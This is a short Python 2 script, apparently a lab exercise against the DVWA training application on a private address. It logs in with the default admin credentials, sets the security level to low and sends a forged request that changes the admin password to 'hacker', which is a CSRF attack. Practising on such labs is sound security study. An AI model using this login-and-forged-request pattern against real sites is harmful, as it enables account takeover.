'''
Created on 2018年9月14日
@author: vevenlcf
@github: https://github.com/vevenlcf
'''

# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
import time


def loginPages():
    url = "http://172.16.8.95/login.php"
    # 请求报头
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
    }
    # 创建session保存cookie
    session = requests.session()
    # 获取响应内容
    html = session.get(url, headers=headers).text

    print html
    # 使用lxml格式
    bs = BeautifulSoup(html, "lxml")
    # 获取lt值
    lt = bs.find("input", attrs={"name": "user_token"}).get("value")
    print lt

    # 创建data表单数据
    data = {
         "username": "admin",
         "password": "password",
         "Login": "Login",
         "user_token": lt,
    }
    # 获取登录cookie值
    session.post(url, data=data, headers=headers)

    #http://172.16.8.95/security.php
    data = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": lt,
    }
    session.post("http://172.16.8.95/security.php", data=data, headers=headers)

    print "=================================="
    # csrf攻击
    # http://172.16.8.177/dvwa/vulnerabilities/csrf/?password_new=hacker&password_conf=hacker&Change=Change
    response = session.get("http://172.16.8.95/vulnerabilities/csrf/?password_new=hacker&password_conf=hacker&Change=Change", headers=headers).text
    print  response
    print "csrf注入成功"

if __name__ == "__main__":
    loginPages()
